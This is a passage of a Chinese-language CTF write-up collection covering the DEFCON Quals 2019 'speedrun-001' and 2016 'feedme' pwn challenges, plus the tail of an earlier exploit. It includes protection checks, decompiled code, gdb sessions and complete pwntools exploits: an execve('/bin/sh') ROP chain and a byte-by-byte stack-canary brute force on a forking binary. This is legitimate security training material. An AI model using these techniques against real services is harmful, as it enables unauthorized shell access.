# mov rdi, rsp ; call r12
add(4793000, 448)
sub(40, 40)
# /bin/sh\0
add(1852400000, 175)
add(6845000, 231)

sendlineafter('=> ', '5')
interactive()
```

## Flag

Flag: `BKPCTF{what_is_2015_minus_7547}`

# DEFCON Quals 2019 Speedrun1

## Information

- Category: Pwn
- Points: 5

## Description

> The Fast and the Furious

## Write-up

```plaintext
λ ~/ file speedrun-001
speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped
λ ~/ pwn checksec speedrun-001
[*] '/home/cub3y0nd/speedrun-001'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```plaintext
Hello brave new challenger
Any last words?
no
This will be the last thing that you say: no

Alas, you had no luck today.
```

看保护知道开了 NX，那可以试试构造 ROP Chain。

这里用典型的调用 `execve()` ROP。

`/bin/sh` 的话我放在了程序可读写的一段内存里，比如 `006b6000` 就很合适，因为是私有地址，也不会影响程序运行。

```plaintext
λ ~/ ./speedrun-001 &
[1] 21519
Hello brave new challenger
Any last words?
[1]  + suspended (tty input)  ./speedrun-001
λ ~/Projects/CTF/ cat /proc/21519/maps
00400000-004b6000 r-xp 00000000 103:07 19662851                          /home/cub3y0nd/Projects/CTF/speedrun-001
006b6000-006bc000 rw-p 000b6000 103:07 19662851                          /home/cub3y0nd/Projects/CTF/speedrun-001
006bc000-006bd000 rw-p 00000000 00:00 0
30bde000-30c01000 rw-p 00000000 00:00 0                                  [heap]
758b8d187000-758b8d18b000 r--p 00000000 00:00 0                          [vvar]
758b8d18b000-758b8d18d000 r-xp 00000000 00:00 0                          [vdso]
7fff62991000-7fff629b2000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
λ ~/ fg
[1]  + continued  ./speedrun-001
zsh: alarm      ./speedrun-001
```

溢出点的话，直接 `cyclic 2000` 怼上去就有了。

## Exploit

```python
#!/usr/bin/python3

from pwn import *

context(
    os='linux',
    arch='amd64',
    log_level='debug',
    terminal='kitty',
    binary=ELF('./speedrun-001')
)

target = process()

recvline      = lambda : target.recvline()
recvuntil     = lambda str : target.recvuntil(str)
sendline      = lambda str : target.sendline(str)
sendlineafter = lambda str1, str2 : target.sendlineafter(str1.encode(), str2.encode())
interactive   = lambda : target.interactive()

rop = ROP(context.binary)

POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]
SYSCALL = rop.find_gadget(['syscall'])[0]
BIN_SH = 0x68732f6e69622f

rop.raw(b'A' * 0x408)
rop.raw(POP_RAX)
rop.raw(0x6b6000)
rop.raw(POP_RDX)
rop.raw(BIN_SH)
# mov qword ptr [rax], rdx ; ret
rop.raw(0x48d251)
rop.raw(POP_RDI)
rop.raw(0x6b6000)
rop.raw(POP_RSI)
rop.raw(0x0)
rop.raw(POP_RDX)
rop.raw(0x0)
rop.raw(POP_RAX)
rop.raw(0x3b)
rop.raw(SYSCALL)

sendline(rop.chain())
interactive()
```

## Flag

Flag: `OOO{Ask any powner. Any real pwner. It don't matter if you pwn by an inch or a m1L3. pwning's pwning.}`

# DEFCON Quals 2016 feedme

## Information

- Category: Pwn
- Points: 5

## Description

> Unknow

## Write-up

```plaintext
λ ~/ file feedme
feedme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
λ ~/ pwn checksec feedme
[*] '/home/cub3y0nd/feedme'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```plaintext
λ ~/Projects/CTF/ ./feedme
FEED ME!
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
ATE 70257025702570257025702570257025...
*** stack smashing detected ***: ./feedme terminated
Child exit.
FEED ME!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
ATE 7025702570257025700a616161616161...
*** stack smashing detected ***: ./feedme terminated
Child exit.
FEED ME!
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
ATE 61616161616161616161616161616161...
*** stack smashing detected ***: ./feedme terminated
Child exit.
FEED ME!
^C
```

可以看到这个程序是有 canary 保护的，但是 `checksec` 没有查出来。并且不能通过格式化字符串漏洞泄漏 canary。

程序在每次触发 canary 之后都会终止并创建一个新进程，这么看大概是用了 `fork()` 函数。那么可以尝试 one by one 逐字节爆破 canary。

one by one 爆破的思想是利用 `fork` 函数来不断逐字节泄漏 canary。`fork` 函数的作用是通过系统调用创建一个与原来进程几乎完全相同的进程，这里的相同也包括 canary。当程序在 `fork` 中触发 canary 时，`__stack_chk_fail` 函数只能关闭 `fork` 函数所创建的进程，但不会让主进程退出，因此当有大量 `fork` 函数时，我们可以用它来逐字节泄漏 canary。

由于我们知道程序是 32-bit 的，所以 canary 是 0x4 Bytes，并且最后一个字节是 `\x00`，前三个字节随机，最多只要尝试 `256 * 3 = 768` 次。由此，爆破理论看上去是可行的，那就可以写爆破脚本了。

我们还知道程序开启了 NX 保护且没有 PIE，那泄漏 canary 之后我们多半需要构造 ROP Chain 来获得 shell。

下面分析程序功能。

伪代码：

从 `main` 函数来看，程序大概会执行 800 次 `fork`，大于我们的最差情况。

```c
void sub_80490B0()
{
  unsigned __int8 v0; // al
  int v1; // [esp+10h] [ebp-18h] BYREF
  unsigned int i; // [esp+14h] [ebp-14h]
  int v3; // [esp+18h] [ebp-10h]
  int v4; // [esp+1Ch] [ebp-Ch]

  v1 = 0;
  for ( i = 0; i <= 0x31F; ++i )
  {
    v3 = sub_806CC70();
    if ( !v3 )
    {
      v0 = sub_8049036();
      sub_804F700("YUM, got %d bytes!\n", v0);
      return;
    }
    v4 = sub_806CBE0(v3, &v1, 0);
    if ( v4 == -1 )
    {
      sub_804FC60("Wait error!");
      sub_804ED20(-1);
    }
    if ( v1 == -1 )
    {
      sub_804FC60("Child IO error!");
      sub_804ED20(-1);
    }
    sub_804FC60("Child exit.");
    sub_804FA20(0);
  }
}
```

```c
int sub_8049036()
{
  const char *v0; // eax
  int result; // eax
  unsigned __int8 v2; // [esp+1Bh] [ebp-2Dh]
  char v3[32]; // [esp+1Ch] [ebp-2Ch] BYREF
  unsigned int v4; // [esp+3Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  sub_804FC60("FEED ME!");
  v2 = sub_8048E42();
  sub_8048E7E(v3, v2);
  v0 = (const char *)sub_8048F6E(v3, v2, 16);
  sub_804F700("ATE %s\n", v0);
  result = v2;
  if ( __readgsdword(0x14u) != v4 )
    sub_806F5B0();
  return result;
}
```

分别在 `sub_804FC60`、`sub_8048E42`、`sub_8048E7E`、`sub_8048F6E` 和 `sub_804F700` 的调用处下断点，然后根据动态调试我们知道 `sub_804FC60` 就是输出了 `FEED ME!` 和 `\n`；`sub_8048E42` 就是获取了我们输入的第一个字节，转换成 ASCII 保存在 AL 中；`sub_8048E7E` 就是根据上一个函数得到的 ASCII 值作为限定大小，让我们输入内容，内容保存到一个指针；`sub_8048F6E` 就是将我们的输入的前 16 个字符转换为 ASCII 值并保存到 EAX 指向的地址；`sub_804F700` 输出了 EAX 中的内容。

具体调试过程太长就不贴出来了。

下面计算一下偏移：

```plaintext
pwndbg> b *0x08049069
Breakpoint 1 at 0x8049069
pwndbg> r
Starting program: /home/cub3y0nd/Projects/CTF/feedme

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.archlinux.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
[Attaching after process 40072 fork to child process 40075]
[New inferior 2 (process 40075)]
[Detaching after fork from parent process 40072]
[Inferior 1 (process 40072) detached]
FEED ME!
0
[Switching to process 40075]

Thread 2.1 "feedme" hit Breakpoint 1, 0x08049069 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────
*EAX  0xffffd58c ◂— 0x0
*EBX  0x80481a8 ◂— push ebx
*ECX  0xffffd55b ◂— 0x130
*EDX  0x1
*EDI  0x80ea00c —▸ 0x8066130 ◂— mov edx, dword ptr [esp + 4]
 ESI  0x0
*EBP  0xffffd5b8 —▸ 0xffffd5e8 —▸ 0xffffd608 —▸ 0x8049970 ◂— push ebx
*ESP  0xffffd570 —▸ 0xffffd58c ◂— 0x0
*EIP  0x8049069 —▸ 0xfffe10e8 ◂— 0x0
────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x8049069    call   8048e7eh                      <0x8048e7e>

   0x804906e    movzx  eax, byte ptr [ebp - 2dh]
   0x8049072    mov    dword ptr [esp + 8], 10h
   0x804907a    mov    dword ptr [esp + 4], eax
   0x804907e    lea    eax, [ebp - 2ch]
   0x8049081    mov    dword ptr [esp], eax
   0x8049084    call   8048f6eh                      <0x8048f6e>

   0x8049089    mov    dword ptr [esp + 4], eax
   0x804908d    mov    dword ptr [esp], 80be715h
   0x8049094    call   804f700h                      <0x804f700>

   0x8049099    movzx  eax, byte ptr [ebp - 2dh]
────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd570 —▸ 0xffffd58c ◂— 0x0
01:0004│-044 0xffffd574 ◂— 0x30 /* '0' */
02:0008│-040 0xffffd578 ◂— 0x0
03:000c│-03c 0xffffd57c —▸ 0x806ccb7 ◂— sub esp, 20h
04:0010│-038 0xffffd580 —▸ 0x80ea200 ◂— 0xfbad2887
05:0014│-034 0xffffd584 —▸ 0x80ea247 ◂— 0xeb4d40a
06:0018│-030 0xffffd588 ◂— 0x300ea248
07:001c│ eax 0xffffd58c ◂— 0x0
──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────
 ► 0 0x8049069
   1 0x80490dc
   2 0x80491da
   3 0x80493ba
   4 0x8048d2b
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
pwndbg> x/30wx 0xffffd58c
0xffffd58c: 0x00000000 0x00002710 0x00000000 0x00000000
0xffffd59c: 0x00000000 0x080ea0a0 0x00000000 0x00000000
0xffffd5ac: 0x39e3a000 0x00000000 0x080ea00c 0xffffd5e8
0xffffd5bc: 0x080490dc 0x080ea0a0 0x00000000 0x080ed840
0xffffd5cc: 0x0804f8b4 0x00000000 0x00000000 0x00000000
0xffffd5dc: 0x080481a8 0x080481a8 0x00000000 0xffffd608
0xffffd5ec: 0x080491da 0x080ea0a0 0x00000000 0x00000002
0xffffd5fc: 0x00000000 0x00000000
pwndbg> i f
Stack level 0, frame at 0xffffd5c0:
 eip = 0x8049069; saved eip = 0x80490dc
 called by frame at 0xffffd5f0
 Arglist at 0xffffd5b8, args:
 Locals at 0xffffd5b8, Previous frame's sp is 0xffffd5c0
 Saved registers:
  ebp at 0xffffd5b8, eip at 0xffffd5bc
pwndbg> distance 0xffffd58c 0xffffd5bc
0xffffd58c->0xffffd5bc is 0x30 bytes (0xc words)
pwndbg> distance 0xffffd5ac 0xffffd58c
0xffffd5ac->0xffffd58c is -0x20 bytes (-0x8 words)
```

输入位于 `0xffffd58c`、canary 位于 `0xffffd5ac`、返回地址位于 `0xffffd5bc`。返回地址偏移量为 `0x30` 字节，canary 偏移量为 `0x20` 字节。

## Exploit

```python
#!/usr/bin/python3

from pwn import *

context(
    os='linux',
    arch='i386',
    log_level='debug',
    terminal='kitty',
    binary=ELF('./feedme')
)

target = process()

recvline      = lambda : target.recvline()
recvuntil     = lambda str : target.recvuntil(str)
send          = lambda str : target.send(str)
sendline      = lambda str : target.sendline(str)
sendlineafter = lambda str1, str2 : target.sendlineafter(str1.encode(), str2.encode())
interactive   = lambda : target.interactive()

padding = b'A' * 0x20

def bruteforce_canary():
    canary = b'\x00'
    recvuntil('FEED ME!\n')
    while len(canary) != 0x4:
        for brute in range(0xff):
            input_size = bytes([0x20 + len(canary) + 0x1])
            attempt = bytes([brute])
            send(input_size + padding + canary + attempt)
            data = recvuntil(b'FEED ME!\n')

            if b'YUM' in data:
                canary += attempt
                break
    return canary

canary = bruteforce_canary()

rop = ROP(context.binary)

MOV_DWORD_PTR_EAX_EDX = p32(0x0807be31)
POP_ECX_EBX = rop.find_gadget(['pop ecx', 'pop ebx', 'ret'])[0]
POP_EDX = rop.find_gadget(['pop edx', 'ret'])[0]
POP_EAX = rop.find_gadget(['pop eax', 'ret'])[0]
INT_0x80 = rop.find_gadget(['int 0x80'])[0]

# /bin
rop.raw(POP_EAX)
rop.raw(0x80e9000)
rop.raw(POP_EDX)
rop.raw(0x6e69622f)
rop.raw(MOV_DWORD_PTR_EAX_EDX)
# /sh
rop.raw(POP_EAX)
rop.raw(0x80e9000 + 0x4)
rop.raw(POP_EDX)
rop.raw(0x68732f)
rop.raw(MOV_DWORD_PTR_EAX_EDX)
# arg 2 and 1
rop.raw(POP_ECX_EBX)
rop.raw(0x0)
rop.raw(0x80e9000)
# arg 3
rop.raw(POP_EDX)
rop.raw(0x0)
# int 0x80
rop.raw(POP_EAX)
rop.raw(0xb)
rop.raw(INT_0x80)

input_size = bytes([len(padding + canary + b'A' * 12 + rop.chain())])

send(input_size + padding + canary + b'A' * 12 + rop.chain())
interactive()
```

## Flag

Flag: `It's too bad! we c0uldn't??! d0 the R0P CHAIN BLIND TOO`
